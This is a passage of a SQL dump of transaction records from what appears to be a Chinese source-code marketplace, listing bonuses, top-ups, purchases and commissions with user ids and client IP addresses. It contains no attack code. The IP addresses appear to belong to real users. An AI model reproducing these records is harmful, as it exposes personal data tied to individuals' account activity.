(247, '1517667934', 15, '帐户金额充值', 1100000, '2018-02-03 22:25:34', '58.46.0.175', NULL, NULL, NULL),
(248, '1517667945', 15, '任务开始，冻结金额(任务编号1517667884task15)', -100000, '2018-02-03 22:25:45', '58.46.0.175', NULL, NULL, NULL),
(249, '1517979336', 15, '任务到期，退回已冻结金额(任务编号1517667884task15)', 100000, '2018-02-07 12:55:36', '182.139.122.123', NULL, NULL, NULL),
(250, '1518249622', 148, '注册会员赠送金额', 0.01, '2018-02-10 16:00:22', '115.35.20.154', NULL, NULL, NULL),
(251, '1519575439', 148, '微信充值1元', 1, '2018-02-26 00:17:19', '140.207.54.74', NULL, NULL, NULL),
(252, '1519624476', 149, '注册会员赠送金额', 0.01, '2018-02-26 13:54:36', '115.206.31.103', NULL, NULL, NULL),
(253, '1519624492', 149, '帐户金额充值', 500000, '2018-02-26 13:54:52', '115.206.31.103', NULL, NULL, NULL),
(254, '1519624850', 149, '购买商品,数量1', -10000, '2018-02-26 14:00:50', '115.206.31.103', NULL, NULL, NULL),
(255, '1519890725', 150, '注册会员赠送金额', 0.01, '2018-03-01 15:52:05', '223.96.221.250', NULL, NULL, NULL),
(256, '1520758258', 151, '注册会员赠送金额', 0.01, '2018-03-11 16:50:58', '223.88.196.16', NULL, NULL, NULL),
(257, '1521441000', 152, '注册会员赠送金额', 0.01, '2018-03-19 14:30:00', '36.4.202.50', NULL, NULL, NULL),
(258, '1521686849', 15, '店铺续费', -1000, '2018-03-22 10:47:29', '175.2.74.232', NULL, NULL, NULL),
(259, '1522156616', 153, '注册会员赠送金额', 0.01, '2018-03-27 21:16:56', '14.116.142.63', NULL, NULL, NULL),
(260, '1522227352', 154, '注册会员赠送金额', 0.01, '2018-03-28 16:55:52', '119.4.253.191', NULL, NULL, NULL),
(261, '1522347403', 116, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金2000元', 8000, '2018-03-30 02:16:43', '124.231.179.99', NULL, NULL, NULL),
(262, '1522833883', 155, '注册会员赠送金额', 0.01, '2018-04-04 17:24:43', '223.96.96.213', NULL, NULL, NULL),
(263, '1523214353', 156, '注册会员赠送金额', 0.01, '2018-04-09 03:05:53', '49.118.221.11', NULL, NULL, NULL),
(264, '1523214522', 156, '积分兑换金钱', 2, '2018-04-09 03:08:42', '49.118.221.11', NULL, NULL, NULL),
(265, '1523680663', 157, '注册会员赠送金额', 0.01, '2018-04-14 12:37:43', '123.151.77.81', NULL, NULL, NULL),
(266, '1524648395', 158, '注册会员赠送金额', 0.01, '2018-04-25 17:26:35', '117.67.9.241', NULL, NULL, NULL),
(267, '1524840864', 14, '帐户金额充值', 55555600, '2018-04-27 22:54:24', '113.220.225.234', NULL, NULL, NULL),
(268, '1524840869', 14, '购买商品,数量1', -58, '2018-04-27 22:54:29', '113.220.225.234', NULL, NULL, NULL),
(269, '1524840878', 15, '成功卖出商品，买方已确认收货，已自动扣除平台佣金11.6元', 46.4, '2018-04-27 22:54:38', '113.220.225.234', NULL, NULL, NULL),
(270, '1524872864', 159, '注册会员赠送金额', 0.01, '2018-04-28 07:47:44', '175.169.152.244', NULL, NULL, NULL),
(271, '1524977169', 159, '缴纳保证金', -0.01, '2018-04-29 12:46:09', '111.182.120.36', NULL, NULL, NULL),
(272, '1525107894', 160, '注册会员赠送金额', 0.01, '2018-05-01 01:04:54', '175.169.152.244', NULL, NULL, NULL),
(273, '1525272256', 161, '注册会员赠送金额', 0.01, '2018-05-02 22:44:16', '183.226.21.47', NULL, NULL, NULL),
(274, '1526817412', 14, '购买商品,数量1', -59, '2018-05-20 19:56:52', '39.188.249.81', NULL, NULL, NULL),
(275, '1526817412', 14, '购买商品,数量1', -1, '2018-05-20 19:56:52', '39.188.249.81', NULL, NULL, NULL),
(276, '1526817412', 14, '购买商品,数量1', -10000, '2018-05-20 19:56:52', '39.188.249.81', NULL, NULL, NULL),
(277, '1526817690', 14, '购买商品,数量1', -100, '2018-05-20 20:01:30', '39.188.249.81', NULL, NULL, NULL),
(278, '1526936303', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金11.8元', 47.2, '2018-05-22 04:58:23', '223.74.155.45', NULL, NULL, NULL),
(279, '1526936303', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金20元', 80, '2018-05-22 04:58:23', '223.74.155.45', NULL, NULL, NULL),
(280, '1526939299', 14, '购买自助广告位ADP01', -160, '2018-05-22 05:48:19', '223.74.155.45', NULL, NULL, NULL),
(281, '1527150592', 162, '注册会员赠送金额', 0.01, '2018-05-24 16:29:52', '123.133.101.154', NULL, NULL, NULL),
(282, '1527819362', 14, '任务开始，冻结金额(任务编号1527819285task14)', -800, '2018-06-01 10:16:02', '113.220.223.152', NULL, NULL, NULL),
(283, '1527819425', 14, '同步金额数字', 0, '2018-06-01 10:17:05', '113.220.223.152', NULL, NULL, NULL),
(284, '1527819431', 14, '帐户金额充值', 8000, '2018-06-01 10:17:11', '113.220.223.152', NULL, NULL, NULL),
(285, '1527995968', 162, '源码商城支付充值1元', 1, '2018-06-03 11:19:28', '139.199.202.243', NULL, NULL, NULL),
(286, '1527996485', 15, '源码商城支付充值2元', 2, '2018-06-03 11:28:05', '139.199.202.243', NULL, NULL, NULL),
(287, '1528165265', 14, '任务到期，退回已冻结金额(任务编号1527819285task14)', 800, '2018-06-05 10:21:05', '54.236.44.46', NULL, NULL, NULL),
(288, '1528190861', 15, '源码商城支付充值1元', 1, '2018-06-05 17:27:41', '139.199.202.243', NULL, NULL, NULL),
(289, '1528206082', 163, '注册会员赠送金额', 0.01, '2018-06-05 21:41:22', '175.2.85.253', NULL, NULL, NULL),
(290, '1528214097', 154, '源码商城支付充值0.02元', 0.02, '2018-06-05 23:54:57', '103.60.165.162', NULL, NULL, NULL),
(291, '1528424284', 164, '注册会员赠送金额', 0.01, '2018-06-08 10:18:04', '49.221.17.34', NULL, NULL, NULL),
(292, '1528508500', 165, '注册会员赠送金额', 0.01, '2018-06-09 09:41:40', '124.135.235.0', NULL, NULL, NULL),
(293, '1528516266', 166, '注册会员赠送金额', 0.01, '2018-06-09 11:51:06', '222.125.4.59', NULL, NULL, NULL),
(294, '1528607435', 167, '注册会员赠送金额', 0.01, '2018-06-10 13:10:35', '58.19.230.80', NULL, NULL, NULL),
(295, '1528725230', 168, '注册会员赠送金额', 0.01, '2018-06-11 21:53:50', '113.57.245.217', NULL, NULL, NULL),
(296, '1528777449', 169, '注册会员赠送金额', 0.01, '2018-06-12 12:24:09', '49.77.1.221', NULL, NULL, NULL),
(297, '1529053455', 170, '注册会员赠送金额', 0.01, '2018-06-15 17:04:15', '113.101.62.12', NULL, NULL, NULL),
(298, '1529843235', 171, '注册会员赠送金额', 0.01, '2018-06-24 20:27:15', '122.142.178.97', NULL, NULL, NULL),
(299, '1530778727', 172, '注册会员赠送金额', 0.01, '2018-07-05 16:18:47', '220.112.121.200', NULL, NULL, NULL),
(300, '1532522108', 173, '注册会员赠送金额', 0.01, '2018-07-25 20:35:08', '111.1.220.146', NULL, NULL, NULL),
(301, '1532533086', 174, '注册会员赠送金额', 0.01, '2018-07-25 23:38:06', '123.151.77.48', NULL, NULL, NULL),
(302, '1532588558', 175, '注册会员赠送金额', 0.01, '2018-07-26 15:02:38', '110.81.185.251', NULL, NULL, NULL),
(303, '1532788959', 176, '注册会员赠送金额', 0.01, '2018-07-28 22:42:39', '175.2.172.251', NULL, NULL, NULL),
(304, '1532788959', 177, '注册会员赠送金额', 0.01, '2018-07-28 22:42:39', '175.2.172.251', NULL, NULL, NULL),
(305, '1532788959', 178, '注册会员赠送金额', 0.01, '2018-07-28 22:42:39', '175.2.172.251', NULL, NULL, NULL),
(306, '1532788959', 179, '注册会员赠送金额', 0.01, '2018-07-28 22:42:39', '175.2.172.251', NULL, NULL, NULL),
(307, '1532788959', 180, '注册会员赠送金额', 0.01, '2018-07-28 22:42:39', '175.2.172.251', NULL, NULL, NULL),
(308, '1532788959', 181, '注册会员赠送金额', 0.01, '2018-07-28 22:42:39', '175.2.172.251', NULL, NULL, NULL),
(309, '1532788959', 182, '注册会员赠送金额', 0.01, '2018-07-28 22:42:39', '175.2.172.251', NULL, NULL, NULL),
(310, '1532788959', 183, '注册会员赠送金额', 0.01, '2018-07-28 22:42:39', '175.2.172.251', NULL, NULL, NULL),
(311, '1532788959', 184, '注册会员赠送金额', 0.01, '2018-07-28 22:42:39', '175.2.172.251', NULL, NULL, NULL),
(312, '1532788959', 185, '注册会员赠送金额', 0.01, '2018-07-28 22:42:39', '175.2.172.251', NULL, NULL, NULL),
(313, '1532835157', 186, '注册会员赠送金额', 0.01, '2018-07-29 11:32:37', '110.184.76.132', NULL, NULL, NULL),
(314, '1532850190', 187, '注册会员赠送金额', 0.01, '2018-07-29 15:43:10', '39.176.69.25', NULL, NULL, NULL),
(315, '1533025187', 188, '注册会员赠送金额', 0.01, '2018-07-31 16:19:47', '113.57.246.85', NULL, NULL, NULL),
(316, '1533624503', 189, '注册会员赠送金额', 0.01, '2018-08-07 14:48:23', '219.82.134.219', NULL, NULL, NULL),
(317, '1533720403', 190, '注册会员赠送金额', 0.01, '2018-08-08 17:26:43', '120.37.167.95', NULL, NULL, NULL),
(318, '1534903522', 191, '注册会员赠送金额', 0.01, '2018-08-22 10:05:22', '123.92.219.223', NULL, NULL, NULL),
(319, '1535042333', 192, '注册会员赠送金额', 0.01, '2018-08-24 00:38:53', '175.2.75.151', NULL, NULL, NULL),
(320, '1535535282', 193, '注册会员赠送金额', 0.01, '2018-08-29 17:34:42', '223.157.221.28', NULL, NULL, NULL),
(321, '1535570708', 194, '注册会员赠送金额', 0.01, '2018-08-30 03:25:08', '223.104.254.147', NULL, NULL, NULL),
(322, '1535909797', 195, '注册会员赠送金额', 0.01, '2018-09-03 01:36:37', '123.151.77.123', NULL, NULL, NULL),
(323, '1536055543', 196, '注册会员赠送金额', 0.01, '2018-09-04 18:05:43', '183.6.27.96', NULL, NULL, NULL),
(324, '1536300741', 197, '注册会员赠送金额', 0.01, '2018-09-07 14:12:21', '183.158.197.236', NULL, NULL, NULL),
(325, '1537162859', 198, '注册会员赠送金额', 0.01, '2018-09-17 13:40:59', '171.109.240.122', NULL, NULL, NULL),
(326, '1537626717', 199, '注册会员赠送金额', 0.01, '2018-09-22 22:31:57', '175.2.49.106', NULL, NULL, NULL),
(327, '1537626747', 199, '源码商城支付充值1元', 1, '2018-09-22 22:32:27', '134.175.9.114', NULL, NULL, NULL),
(328, '1537626790', 199, '源码商城支付充值2元', 2, '2018-09-22 22:33:10', '134.175.9.114', NULL, NULL, NULL),
(329, '1537709162', 200, '注册会员赠送金额', 0.01, '2018-09-23 21:26:02', '106.12.19.7', NULL, NULL, NULL),
(330, '1537713782', 201, '注册会员赠送金额', 0.01, '2018-09-23 22:43:02', '111.15.93.220', NULL, NULL, NULL),
(331, '1537885301', 202, '注册会员赠送金额', 0.01, '2018-09-25 22:21:41', '124.226.60.229', NULL, NULL, NULL),
(332, '1538226330', 203, '注册会员赠送金额', 0.01, '2018-09-29 21:05:30', '110.212.254.161', NULL, NULL, NULL),
(333, '1538329560', 15, 'v支付充值1元', 1, '2018-10-01 01:46:00', '193.112.76.14', NULL, NULL, NULL),
(334, '1538330041', 204, '注册会员赠送金额', 0.01, '2018-10-01 01:54:01', '175.2.87.46', NULL, NULL, NULL),
(335, '1538330069', 204, 'v支付充值1元', 1, '2018-10-01 01:54:29', '193.112.76.14', NULL, NULL, NULL),
(336, '1538330119', 204, 'v支付充值1元', 1, '2018-10-01 01:55:19', '193.112.76.14', NULL, NULL, NULL),
(337, '1538330175', 204, 'v支付充值1元', 1, '2018-10-01 01:56:15', '193.112.76.14', NULL, NULL, NULL),
(338, '1538662427', 205, '注册会员赠送金额', 0.01, '2018-10-04 22:13:47', '39.181.177.19', NULL, NULL, NULL),
(339, '1538666334', 206, '注册会员赠送金额', 0.01, '2018-10-04 23:18:54', '223.73.86.181', NULL, NULL, NULL),
(340, '1538826021', 207, '注册会员赠送金额', 0.01, '2018-10-06 19:40:21', '171.213.91.174', NULL, NULL, NULL),
(341, '1539313615', 208, '注册会员赠送金额', 0.01, '2018-10-12 11:06:55', '36.157.182.11', NULL, NULL, NULL),
(342, '1539326871', 209, '注册会员赠送金额', 0.01, '2018-10-12 14:47:51', '59.51.4.225', NULL, NULL, NULL),
(343, '1539355587', 210, '注册会员赠送金额', 0.01, '2018-10-12 22:46:27', '222.242.69.158', NULL, NULL, NULL),
(344, '1539440826', 211, '注册会员赠送金额', 0.01, '2018-10-13 22:27:06', '222.242.69.158', NULL, NULL, NULL),
(345, '1539440944', 212, '注册会员赠送金额', 0.01, '2018-10-13 22:29:04', '180.88.184.19', NULL, NULL, NULL),
(346, '1540271886', 213, '注册会员赠送金额', 0.01, '2018-10-23 13:18:06', '180.136.232.30', NULL, NULL, NULL),
(347, '1540435069', 214, '注册会员赠送金额', 0.01, '2018-10-25 10:37:49', '125.120.14.210', NULL, NULL, NULL),
(348, '1541054471', 215, '注册会员赠送金额', 0.01, '2018-11-01 14:41:11', '1.194.68.36', NULL, NULL, NULL),
(349, '1541559731', 216, '注册会员赠送金额', 0.01, '2018-11-07 11:02:11', '222.216.129.33', NULL, NULL, NULL),
(350, '1542525693', 217, '注册会员赠送金额', 0.01, '2018-11-18 15:21:33', '223.88.38.105', NULL, NULL, NULL),
(351, '1543463621', 218, '注册会员赠送金额', 0.01, '2018-11-29 11:53:41', '222.142.73.43', NULL, NULL, NULL),
(352, '1543675484', 219, '注册会员赠送金额', 0.01, '2018-12-01 22:44:44', '223.157.165.218', NULL, NULL, NULL),
(353, '1544509837', 220, '注册会员赠送金额', 0.01, '2018-12-11 14:30:37', '111.227.7.37', NULL, NULL, NULL),
(354, '1545232934', 221, '注册会员赠送金额', 0.01, '2018-12-19 23:22:14', '101.46.20.30', NULL, NULL, NULL),
(355, '1545624747', 222, '注册会员赠送金额', 0.01, '2018-12-24 12:12:27', '110.124.183.83', NULL, NULL, NULL),
(356, '1546084229', 223, '注册会员赠送金额', 0.01, '2018-12-29 19:50:29', '116.196.91.211', NULL, NULL, NULL),
(357, '1546296670', 224, '注册会员赠送金额', 0.01, '2019-01-01 06:51:10', '119.136.113.237', NULL, NULL, NULL),
(358, '1546957162', 225, '注册会员赠送金额', 0.01, '2019-01-08 22:19:22', '110.184.83.187', NULL, NULL, NULL),
(359, '1547102158', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金0.2元', 0.8, '2019-01-10 14:35:58', '223.157.173.196', NULL, NULL, NULL),
(360, '1547703616', 226, '注册会员赠送金额', 0.01, '2019-01-17 13:40:16', '139.205.13.91', NULL, NULL, NULL),
(361, '1547992899', 227, '注册会员赠送金额', 0.01, '2019-01-20 22:01:39', '120.230.81.190', NULL, NULL, NULL),
(362, '1548511592', 228, '注册会员赠送金额', 0.01, '2019-01-26 22:06:32', '124.115.133.200', NULL, NULL, NULL),
(363, '1550413794', 229, '注册会员赠送金额', 0.01, '2019-02-17 22:29:54', '113.127.227.143', NULL, NULL, NULL),
(364, '1551012191', 230, '注册会员赠送金额', 0.01, '2019-02-24 20:43:11', '121.35.0.170', NULL, NULL, NULL),
(365, '1551370316', 231, '注册会员赠送金额', 0.01, '2019-03-01 00:11:56', '114.107.29.214', NULL, NULL, NULL),
(366, '1551381736', 232, '注册会员赠送金额', 0.01, '2019-03-01 03:22:16', '113.96.219.243', NULL, NULL, NULL),
(367, '1551409643', 233, '注册会员赠送金额', 0.01, '2019-03-01 11:07:23', '39.185.119.23', NULL, NULL, NULL),
(368, '1551519263', 234, '注册会员赠送金额', 0.01, '2019-03-02 17:34:23', '101.130.165.179', NULL, NULL, NULL),
(369, '1553094755', 235, '注册会员赠送金额', 0.01, '2019-03-20 23:12:35', '223.96.159.82', NULL, NULL, NULL),
(370, '1553154543', 236, '注册会员赠送金额', 0.01, '2019-03-21 15:49:03', '113.246.174.92', NULL, NULL, NULL),
(371, '1553238206', 237, '注册会员赠送金额', 0.01, '2019-03-22 15:03:26', '219.138.247.109', NULL, NULL, NULL),
(372, '1553846296', 238, '注册会员赠送金额', 0.01, '2019-03-29 15:58:16', '223.96.219.17', NULL, NULL, NULL),
(373, '1554034817', 15, '店铺续费', -1000, '2019-03-31 20:20:17', '223.74.105.155', NULL, NULL, NULL),
(374, '1554255520', 239, '注册会员赠送金额', 1000, '2019-04-03 09:38:40', '61.151.178.176', NULL, NULL, NULL),
(375, '1554255728', 239, '购买商品,数量1', -600, '2019-04-03 09:42:08', '61.151.178.176', NULL, NULL, NULL),
(376, '1554460174', 240, '注册会员赠送金额', 1000, '2019-04-05 18:29:34', '60.255.32.19', NULL, NULL, NULL),
(377, '1554977308', 241, '注册会员赠送金额', 1000, '2019-04-11 18:08:28', '219.134.217.48', NULL, NULL, NULL),
(378, '1554977750', 241, '购买商品,数量1', -600, '2019-04-11 18:15:50', '219.134.217.48', NULL, NULL, NULL),
(379, '1554981144', 242, '注册会员赠送金额', 1000, '2019-04-11 19:12:24', '223.104.9.214', NULL, NULL, NULL),
(380, '1555127274', 243, '注册会员赠送金额', 1000, '2019-04-13 11:47:54', '14.221.117.105', NULL, NULL, NULL),
(381, '1555138323', 244, '注册会员赠送金额', 1000, '2019-04-13 14:52:03', '36.37.140.92', NULL, NULL, NULL),
(382, '1555138935', 244, '店铺续费', -1000, '2019-04-13 15:02:15', '36.37.140.92', NULL, NULL, NULL),
(1010, '1556605294', 869, '注册会员赠送金额', 1000, '2019-04-30 14:21:34', '115.194.38.239', NULL, NULL, NULL),
(1011, '1556605294', 870, '注册会员赠送金额', 1000, '2019-04-30 14:21:34', '115.194.38.239', NULL, NULL, NULL),
(1012, '1556605294', 871, '注册会员赠送金额', 1000, '2019-04-30 14:21:34', '115.194.38.239', NULL, NULL, NULL),
(1013, '1556605294', 872, '注册会员赠送金额', 1000, '2019-04-30 14:21:34', '115.194.38.239', NULL, NULL, NULL),
(1009, '1556605294', 868, '注册会员赠送金额', 1000, '2019-04-30 14:21:34', '115.194.38.239', NULL, NULL, NULL),
(1008, '1556605294', 867, '注册会员赠送金额', 1000, '2019-04-30 14:21:34', '115.194.38.239', NULL, NULL, NULL),
(1007, '1556605294', 866, '注册会员赠送金额', 1000, '2019-04-30 14:21:34', '115.194.38.239', NULL, NULL, NULL),
(1006, '1556605294', 865, '注册会员赠送金额', 1000, '2019-04-30 14:21:34', '115.194.38.239', NULL, NULL, NULL),
(1005, '1556605294', 864, '注册会员赠送金额', 1000, '2019-04-30 14:21:34', '115.194.38.239', NULL, NULL, NULL),
(1004, '1556605294', 863, '注册会员赠送金额', 1000, '2019-04-30 14:21:34', '115.194.38.239', NULL, NULL, NULL),
(1003, '1556605294', 862, '注册会员赠送金额', 1000, '2019-04-30 14:21:34', '115.194.38.239', NULL, NULL, NULL),
(1002, '1556605294', 861, '注册会员赠送金额', 1000, '2019-04-30 14:21:34', '115.194.38.239', NULL, NULL, NULL),
(483, '1555740967', 345, '注册会员赠送金额', 1000, '2019-04-20 14:16:07', '223.157.115.211', NULL, NULL, NULL),
(984, '1556032389', 215, '同步金额数字', 0, '2019-04-23 23:13:09', '223.91.37.195', NULL, NULL, NULL),
(985, '1556098230', 846, '注册会员赠送金额', 1000, '2019-04-24 17:30:30', '1.193.200.246', NULL, NULL, NULL),
(986, '1556160577', 847, '注册会员赠送金额', 1000, '2019-04-25 10:49:37', '183.205.179.2', NULL, NULL, NULL),
(987, '1556160583', 847, '购买商品,数量1', -400, '2019-04-25 10:49:43', '183.205.179.2', NULL, NULL, NULL),
(988, '1556304730', 848, '注册会员赠送金额', 1000, '2019-04-27 02:52:10', '171.37.28.16', NULL, NULL, NULL),
(989, '1556469554', 849, '注册会员赠送金额', 1000, '2019-04-29 00:39:14', '112.224.33.133', NULL, NULL, NULL),
(990, '1556470011', 849, '提现申请', -100, '2019-04-29 00:46:51', '112.224.33.133', NULL, NULL, NULL),
(991, '1556605294', 850, '注册会员赠送金额', 1000, '2019-04-30 14:21:34', '115.194.38.239', NULL, NULL, NULL),
(992, '1556605294', 851, '注册会员赠送金额', 1000, '2019-04-30 14:21:34', '115.194.38.239', NULL, NULL, NULL),
(993, '1556605294', 852, '注册会员赠送金额', 1000, '2019-04-30 14:21:34', '115.194.38.239', NULL, NULL, NULL),
(994, '1556605294', 853, '注册会员赠送金额', 1000, '2019-04-30 14:21:34', '115.194.38.239', NULL, NULL, NULL),
(995, '1556605294', 854, '注册会员赠送金额', 1000, '2019-04-30 14:21:34', '115.194.38.239', NULL, NULL, NULL),
(996, '1556605294', 855, '注册会员赠送金额', 1000, '2019-04-30 14:21:34', '115.194.38.239', NULL, NULL, NULL),
(997, '1556605294', 856, '注册会员赠送金额', 1000, '2019-04-30 14:21:34', '115.194.38.239', NULL, NULL, NULL),
(998, '1556605294', 857, '注册会员赠送金额', 1000, '2019-04-30 14:21:34', '115.194.38.239', NULL, NULL, NULL),
(999, '1556605294', 858, '注册会员赠送金额', 1000, '2019-04-30 14:21:34', '115.194.38.239', NULL, NULL, NULL),
(1000, '1556605294', 859, '注册会员赠送金额', 1000, '2019-04-30 14:21:34', '115.194.38.239', NULL, NULL, NULL),
(1001, '1556605294', 860, '注册会员赠送金额', 1000, '2019-04-30 14:21:34', '115.194.38.239', NULL, NULL, NULL),
(1090, '1556605295', 949, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1089, '1556605295', 948, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1088, '1556605295', 947, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1087, '1556605295', 946, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1086, '1556605295', 945, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1085, '1556605295', 944, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1084, '1556605295', 943, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1083, '1556605295', 942, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1082, '1556605295', 941, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1081, '1556605295', 940, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1080, '1556605295', 939, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL);
INSERT INTO `yjcode_moneyrecord` (`id`, `bh`, `userid`, `tit`, `moneynum`, `sj`, `uip`, `admin`, `rengbh`, `jyh`) VALUES
(1079, '1556605295', 938, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1078, '1556605295', 937, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1077, '1556605295', 936, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1076, '1556605295', 935, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1075, '1556605295', 934, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1074, '1556605295', 933, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1073, '1556605295', 932, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1072, '1556605295', 931, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1071, '1556605295', 930, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1070, '1556605295', 929, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1069, '1556605295', 928, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1068, '1556605295', 927, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1067, '1556605295', 926, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1066, '1556605295', 925, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1065, '1556605295', 924, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1064, '1556605295', 923, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1063, '1556605295', 922, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1062, '1556605295', 921, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1061, '1556605295', 920, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1060, '1556605295', 919, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1059, '1556605295', 918, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1058, '1556605295', 917, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1057, '1556605295', 916, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1056, '1556605295', 915, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1055, '1556605295', 914, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1054, '1556605295', 913, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1053, '1556605295', 912, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1052, '1556605295', 911, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1051, '1556605295', 910, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1050, '1556605295', 909, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1049, '1556605295', 908, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1048, '1556605295', 907, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1047, '1556605295', 906, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1046, '1556605295', 905, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1045, '1556605295', 904, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1044, '1556605295', 903, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1043, '1556605295', 902, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1042, '1556605295', 901, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1041, '1556605295', 900, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1040, '1556605295', 899, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1039, '1556605295', 898, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1038, '1556605295', 897, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1037, '1556605295', 896, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1036, '1556605295', 895, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1035, '1556605295', 894, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1034, '1556605295', 893, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1033, '1556605295', 892, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1032, '1556605295', 891, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1031, '1556605295', 890, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1030, '1556605295', 889, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1029, '1556605295', 888, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1028, '1556605295', 887, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1027, '1556605295', 886, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
